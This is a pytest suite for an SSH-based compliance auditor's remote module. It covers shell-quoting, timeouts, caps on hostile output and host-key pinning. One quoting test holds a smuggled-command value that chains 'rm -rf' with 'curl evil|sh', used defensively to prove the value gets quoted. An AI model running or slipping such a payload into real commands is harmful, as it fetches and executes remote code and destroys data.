"""Tests for grc_auditor.remote: argv quoting and connect/command error
classification (connect timeout, command timeout mid-run). No live SSH --
we drive RemoteHost and the pure classifier with fabricated paramiko/socket
exceptions. (Bastion support was cut in the ELI-142 carve; these tests no
longer cover bastion-specific host-key-mismatch routing.)
"""

from __future__ import annotations

import base64
import socket

import paramiko
import pytest

import grc_auditor.remote as remote_mod
from grc_auditor.config import CredentialGroup
from grc_auditor.remote import (
    CommandResult, ConnectionFailed, HostKeyMismatch,
    RemoteError, RemoteHost, UnknownHostKey, _classify_connect_error,
)


def test_run_argv_quotes_every_token():
    # run_argv must shell-quote each token so a value containing shell
    # metacharacters (e.g. derived from a hostile target's command output)
    # cannot break out of the intended argument and inject a command.
    captured = {}

    class _Conn(RemoteHost):
        def __init__(self):
            pass

        def run(self, command, *, sudo=False, timeout=None):
            captured["command"] = command
            captured["sudo"] = sudo
            return CommandResult(0, "", "")

    _Conn().run_argv(["rm", "-rf", "/tmp/x; curl evil|sh"], sudo=True)
    assert captured["command"] == "rm -rf '/tmp/x; curl evil|sh'"
    assert captured["sudo"] is True


class _FakeKey:
    """Minimal stand-in for a paramiko host key (the bits remote.py touches)."""

    def __init__(self, name="ssh-ed25519", blob=b"\x01\x02\x03"):
        self._name = name
        self._blob = blob

    def asbytes(self) -> bytes:
        return self._blob

    def get_name(self) -> str:
        return self._name

    def get_base64(self) -> str:
        return base64.b64encode(self._blob).decode("ascii")


# --------------------------------------------------------------------------- #
# Timeout paths (ELI-141)
#
# The failure mode that matters here is a fleet scan hanging or silently
# dropping hosts. These tests pin: a connect-level timeout is classified as a
# ConnectionFailed (a RemoteError, so a caller's `except RemoteError` still
# catches it and the host is bucketed UNREACHABLE), and a command that times
# out mid-run raises RemoteError rather than blocking or returning a bogus
# CommandResult. No live SSH -- fabricated paramiko/socket exceptions and a
# fake exec_command stream drive it offline.
# --------------------------------------------------------------------------- #
def test_connect_timeout_is_classified_as_connection_failed():
    err = _classify_connect_error(socket.timeout("timed out"), "192.0.2.21")

    assert isinstance(err, ConnectionFailed)
    assert isinstance(err, RemoteError)
    assert "timed out" in str(err)


class _FakeTimeoutSSHClient:
    """Stands in for paramiko.SSHClient: connect() always times out, and
    records whether it was torn down so a timed-out attempt never leaks."""

    def __init__(self):
        self.closed = False

    def load_system_host_keys(self):
        pass

    def load_host_keys(self, path):
        pass

    def set_missing_host_key_policy(self, policy):
        pass

    def connect(self, **kwargs):
        raise socket.timeout("timed out")

    def close(self):
        self.closed = True


def test_connect_timeout_raises_connection_failed_and_tears_down_client(monkeypatch):
    fake_client = _FakeTimeoutSSHClient()
    monkeypatch.setattr(remote_mod.paramiko, "SSHClient", lambda: fake_client)

    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("192.0.2.21", group, known_hosts=None)

    with pytest.raises(ConnectionFailed):
        rh.connect()
    # A timed-out connect attempt must not leak a half-open client.
    assert fake_client.closed is True


class _FakeClock:
    """Stands in for the time module in remote.py, so deadline tests run
    instantly. Each sleep and each chunk the target sends moves it forward."""

    def __init__(self):
        self.now = 0.0

    def monotonic(self):
        return self.now

    def sleep(self, seconds):
        self.now += seconds


class _ScriptedChannel:
    """A paramiko channel for a target that sends ``chunks`` copies of
    ``chunk`` on one stream, then exits. Each chunk costs ``seconds_per_chunk``
    on the fake clock. ``chunks=0`` with ``exits=False`` is a command that
    hangs silently."""

    def __init__(self, chunk=b"", chunks=0, stream="out", clock=None,
                 seconds_per_chunk=0.0, exits=True):
        self.chunk = chunk
        self.left = chunks
        self.stream = stream
        self.clock = clock
        self.seconds_per_chunk = seconds_per_chunk
        self.exits = exits
        self.closed = False

    def _send(self):
        self.left -= 1
        if self.clock is not None:
            self.clock.now += self.seconds_per_chunk
        return self.chunk

    def recv_ready(self):
        return self.stream == "out" and self.left > 0

    def recv(self, n):
        return self._send()

    def recv_stderr_ready(self):
        return self.stream == "err" and self.left > 0

    def recv_stderr(self, n):
        return self._send()

    def exit_status_ready(self):
        return self.exits and self.left <= 0

    @property
    def eof_received(self):
        return self.exits and self.left <= 0

    def recv_exit_status(self):
        return 0

    def close(self):
        self.closed = True


class _ChannelStream:
    """The file-style stdout/stderr object exec_command returns, backed by a
    _ScriptedChannel."""

    def __init__(self, channel, stream):
        self.channel = channel
        self._stream = stream

    def read(self, n):
        ch = self.channel
        if ch.stream != self._stream or ch.left <= 0:
            return b""
        return ch._send()


class _FakeStdin:
    class _Channel:
        def shutdown_write(self):
            pass

    channel = _Channel()


class _ChannelClient:
    def __init__(self, channel):
        self.channel = channel

    def exec_command(self, command, timeout=None):
        return (_FakeStdin(), _ChannelStream(self.channel, "out"),
                _ChannelStream(self.channel, "err"))


def _host_on(channel):
    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("192.0.2.21", group, known_hosts=None)
    rh._client = _ChannelClient(channel)
    return rh


def test_run_command_timeout_mid_run_raises_remote_error_not_a_hang(monkeypatch):
    clock = _FakeClock()
    monkeypatch.setattr(remote_mod, "time", clock, raising=False)
    channel = _ScriptedChannel(exits=False)
    rh = _host_on(channel)

    with pytest.raises(RemoteError, match="timed out"):
        rh.run("some-long-running-command", timeout=5)
    assert channel.closed


# --------------------------------------------------------------------------- #
# Hostile output (ELI-929). A target controls what a command prints and how
# fast. run() must not buffer more than a fixed cap, and `timeout` is a total
# deadline, so a target that never stops sending still fails the command.
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("stream", ["out", "err"])
def test_run_refuses_output_past_the_cap(stream):
    chunk = b"x" * 65536
    channel = _ScriptedChannel(chunk=chunk, chunks=512, stream=stream)
    rh = _host_on(channel)

    with pytest.raises(RemoteError, match="output"):
        rh.run("cat /dev/zero", timeout=600)
    assert 512 * len(chunk) > remote_mod.MAX_COMMAND_OUTPUT_BYTES
    assert channel.left > 0, "read the whole flood instead of stopping at the cap"
    assert channel.closed


def test_run_deadline_is_total_not_per_read(monkeypatch):
    # One byte per second keeps every single read inside any idle timeout.
    clock = _FakeClock()
    monkeypatch.setattr(remote_mod, "time", clock, raising=False)
    channel = _ScriptedChannel(chunk=b".", chunks=1000, clock=clock,
                               seconds_per_chunk=1.0)
    rh = _host_on(channel)

    with pytest.raises(RemoteError, match="timed out"):
        rh.run("yes", timeout=5)
    assert clock.now < 10
    assert channel.closed


def test_run_returns_output_and_exit_code_under_the_limits():
    channel = _ScriptedChannel(chunk=b"ok\n", chunks=3)
    result = _host_on(channel).run("printf ok", timeout=30)

    assert result == CommandResult(0, "ok\nok\nok\n", "")


class _ExecServer(paramiko.ServerInterface):
    """Accepts any user with no auth and answers each exec by running
    ``respond(channel)`` on a thread, the way sshd runs a command."""

    def __init__(self, respond):
        self.respond = respond

    def get_allowed_auths(self, username):
        return "none"

    def check_auth_none(self, username):
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def check_channel_exec_request(self, channel, command):
        import threading
        threading.Thread(target=self.respond, args=(channel,), daemon=True).start()
        return True


class _TransportClient:
    """exec_command the way paramiko.SSHClient does it, on a bare Transport."""

    def __init__(self, transport):
        self.t = transport

    def exec_command(self, command, timeout=None):
        chan = self.t.open_session()
        chan.settimeout(timeout)
        chan.exec_command(command)
        return (chan.makefile_stdin("wb"), chan.makefile("r"),
                chan.makefile_stderr("r"))


def _run_on_real_channel(server_key, respond, timeout=30):
    client_sock, server_sock = socket.socketpair()
    server_t = paramiko.Transport(server_sock)
    server_t.add_server_key(server_key)
    import threading
    server_t.start_server(event=threading.Event(), server=_ExecServer(respond))
    client_t = paramiko.Transport(client_sock)
    try:
        client_t.start_client(timeout=10)
        client_t.auth_none("ubuntu")
        group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
        rh = RemoteHost("192.0.2.21", group, known_hosts=None)
        rh._client = _TransportClient(client_t)
        return rh.run("oscap xccdf eval", timeout=timeout)
    finally:
        client_t.close()
        server_t.close()


def test_run_reads_all_output_before_the_exit_status_on_a_real_channel(server_key):
    out = b"o" * (3 << 20)
    err = b"e" * (200 << 10)

    def respond(ch):
        for i in range(0, len(out), 1 << 20):
            ch.sendall(out[i:i + (1 << 20)])
            ch.sendall_stderr(err[:len(err) // 3])
        ch.sendall_stderr(err[: len(err) - 3 * (len(err) // 3)])
        ch.send_exit_status(3)
        ch.close()

    result = _run_on_real_channel(server_key, respond)
    assert result.exit_code == 3
    assert result.stdout.encode() == out
    assert len(result.stderr) == len(err)


def test_run_reads_output_that_arrives_after_the_exit_status(server_key):
    # sshd sends exit-status when the child exits and may still be draining
    # the child's pipe, so output can follow the status (review finding 1).
    import time as real_time

    def respond(ch):
        ch.send_exit_status(0)
        real_time.sleep(0.3)
        ch.sendall(b"VERSION_ID=22.04\n")
        ch.shutdown_write()
        ch.close()

    result = _run_on_real_channel(server_key, respond)
    assert result.stdout == "VERSION_ID=22.04\n"
    assert result.exit_code == 0


class _SilentStartClient:
    """A target that accepts the session but never answers the exec or sftp
    request: the call blocks until the connection is closed, as paramiko's
    unbounded _wait_for_event does (review finding 2)."""

    def __init__(self):
        import threading
        self.closed = threading.Event()

    def _wait(self):
        if not self.closed.wait(10):
            raise AssertionError("never woken")
        raise paramiko.SSHException("Channel closed.")

    def exec_command(self, command, timeout=None):
        self._wait()

    def open_sftp(self):
        self._wait()

    def close(self):
        self.closed.set()


def _silent_start_host():
    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("192.0.2.21", group, known_hosts=None)
    rh._client = _SilentStartClient()
    return rh


def test_run_deadline_covers_an_exec_request_the_target_never_answers():
    import time as real_time
    rh = _silent_start_host()
    started = real_time.monotonic()
    with pytest.raises(RemoteError, match="timed out"):
        rh.run("true", timeout=0.3)
    assert real_time.monotonic() - started < 5


def test_get_file_deadline_covers_an_sftp_request_the_target_never_answers(tmp_path):
    import time as real_time
    rh = _silent_start_host()
    started = real_time.monotonic()
    with pytest.raises(RemoteError, match="timed out"):
        rh.get_file("/var/lib/grc_audit.Ab3xZ9/results.xml",
                    str(tmp_path / "results.xml"), timeout=0.3)
    assert real_time.monotonic() - started < 5


def test_get_file_deadline_is_total_not_per_read(tmp_path):
    # paramiko's read(n) loops one SFTP READ at a time until it has n bytes,
    # so a target that answers each READ with one byte just inside the
    # channel timeout holds a single read() call for hours (review round 2).
    # Here that read blocks until the connection is closed.
    import threading
    import time as real_time

    closed = threading.Event()
    sftp = _FakeSFTP(size=1000)

    def trickle(n):
        if not closed.wait(10):
            raise AssertionError("never woken")
        raise EOFError()

    sftp._serve = trickle

    class _Client(_SFTPClient):
        def close(self):
            closed.set()

    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("192.0.2.21", group, known_hosts=None)
    rh._client = _Client(sftp)
    local = tmp_path / "results.xml"
    started = real_time.monotonic()
    with pytest.raises(RemoteError, match="timed out"):
        rh.get_file("/var/lib/grc_audit.Ab3xZ9/results.xml", str(local), timeout=0.3)
    assert real_time.monotonic() - started < 5
    assert not local.exists()


def test_run_stops_a_real_flood_at_the_cap(server_key):
    def respond(ch):
        block = b"x" * (1 << 20)
        try:
            while True:
                ch.sendall(block)
        except Exception:
            pass

    with pytest.raises(RemoteError, match="output"):
        _run_on_real_channel(server_key, respond)


# --------------------------------------------------------------------------- #
# Evidence size cap during SFTP (ELI-929). The target's stat() can lie, so the
# cap is enforced on the bytes actually received.
# --------------------------------------------------------------------------- #
class _FakeSFTP:
    """An SFTP session serving one remote file of ``size`` bytes whose stat()
    claims 100 bytes, as a hostile target could."""

    class _File:
        def __init__(self, sftp):
            self.sftp = sftp

        def read(self, n):
            return self.sftp._serve(n)

        def close(self):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self.close()

    class _Channel:
        def settimeout(self, t):
            pass

    def __init__(self, size):
        self.size = size
        self.served = 0

    def _serve(self, n):
        n = min(n, 32768, self.size - self.served)
        self.served += n
        return b"x" * n

    def get_channel(self):
        return self._Channel()

    def stat(self, path):
        return type("Attrs", (), {"st_size": 100})()

    def open(self, path, mode="r", bufsize=-1):
        return self._File(self)

    def get(self, remotepath, localpath, callback=None, prefetch=True,
            max_concurrent_prefetch_requests=None):
        with open(localpath, "wb") as fh:
            while self.served < self.size:
                fh.write(self._serve(32768))

    def close(self):
        pass


class _SFTPClient:
    def __init__(self, sftp):
        self.sftp = sftp

    def open_sftp(self):
        return self.sftp


def _host_with_sftp(sftp):
    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("192.0.2.21", group, known_hosts=None)
    rh._client = _SFTPClient(sftp)
    return rh


def test_get_file_refuses_an_oversized_file_during_the_download(tmp_path, monkeypatch):
    cap = 1 << 20
    monkeypatch.setattr(remote_mod, "MAX_EVIDENCE_BYTES", cap, raising=False)
    sftp = _FakeSFTP(size=4 * cap)
    local = tmp_path / "ev" / "results.xml"

    with pytest.raises(RemoteError, match="larger than"):
        _host_with_sftp(sftp).get_file("/var/lib/grc_audit.Ab3xZ9/results.xml", str(local))
    assert sftp.served <= cap + 65536, "downloaded past the cap before refusing"
    assert not local.exists(), "left a truncated evidence file behind"


def test_get_file_copies_a_file_under_the_cap(tmp_path):
    sftp = _FakeSFTP(size=70000)
    local = tmp_path / "ev" / "results.xml"

    _host_with_sftp(sftp).get_file("/var/lib/grc_audit.Ab3xZ9/results.xml", str(local))
    assert local.read_bytes() == b"x" * 70000


def test_scan_parser_cap_is_the_evidence_cap():
    from grc_auditor import scan
    assert scan._MAX_RESULTS_BYTES == remote_mod.MAX_EVIDENCE_BYTES


# --------------------------------------------------------------------------- #
# Host-key pinning (ELI-929). A real paramiko server runs in-process over a
# socketpair, so the host-key check is paramiko's own, not a mock of it.
# --------------------------------------------------------------------------- #
TARGET = "192.0.2.21"


@pytest.fixture(scope="module")
def server_key():
    return paramiko.RSAKey.generate(2048)


@pytest.fixture
def home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    return home


def _known_hosts_line(host, key):
    return f"{host} {key.get_name()} {key.get_base64()}\n"


def _connect_to_in_process_server(monkeypatch, server_key, known_hosts):
    """RemoteHost.connect() against a paramiko server on a socketpair. Returns
    the RemoteError it raised. The server allows no auth method, so a host
    key that passes still ends in an error, just not a host-key one."""
    import threading

    client_sock, server_sock = socket.socketpair()

    def serve():
        t = paramiko.Transport(server_sock)
        t.add_server_key(server_key)
        try:
            t.start_server(server=paramiko.ServerInterface())
            t.accept(timeout=5)
        except Exception:
            pass
        finally:
            t.close()

    server = threading.Thread(target=serve, daemon=True)
    server.start()

    real_client = paramiko.SSHClient

    class _SocketpairClient(real_client):
        def connect(self, **kwargs):
            kwargs["sock"] = client_sock
            return super().connect(**kwargs)

    monkeypatch.setattr(remote_mod.paramiko, "SSHClient", _SocketpairClient)
    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"],
                            use_agent=False)
    try:
        with pytest.raises(RemoteError) as exc_info:
            RemoteHost(TARGET, group, known_hosts=known_hosts,
                       connect_timeout=10).connect()
    finally:
        client_sock.close()
        server.join(timeout=10)
    return exc_info.value


def test_configured_known_hosts_rejects_a_key_only_in_the_user_file(
        tmp_path, home, monkeypatch, server_key):
    (home / ".ssh" / "known_hosts").write_text(_known_hosts_line(TARGET, server_key))
    pinned = tmp_path / "fleet_known_hosts"
    pinned.write_text(_known_hosts_line("192.0.2.99", paramiko.RSAKey.generate(1024)))

    err = _connect_to_in_process_server(monkeypatch, server_key, str(pinned))
    assert isinstance(err, UnknownHostKey), err


def test_configured_known_hosts_accepts_its_own_pin(
        tmp_path, home, monkeypatch, server_key):
    pinned = tmp_path / "fleet_known_hosts"
    pinned.write_text(_known_hosts_line(TARGET, server_key))

    err = _connect_to_in_process_server(monkeypatch, server_key, str(pinned))
    assert not isinstance(err, (UnknownHostKey, HostKeyMismatch)), err


def test_user_known_hosts_is_used_when_none_is_configured(
        home, monkeypatch, server_key):
    (home / ".ssh" / "known_hosts").write_text(_known_hosts_line(TARGET, server_key))

    err = _connect_to_in_process_server(monkeypatch, server_key, None)
    assert not isinstance(err, (UnknownHostKey, HostKeyMismatch)), err
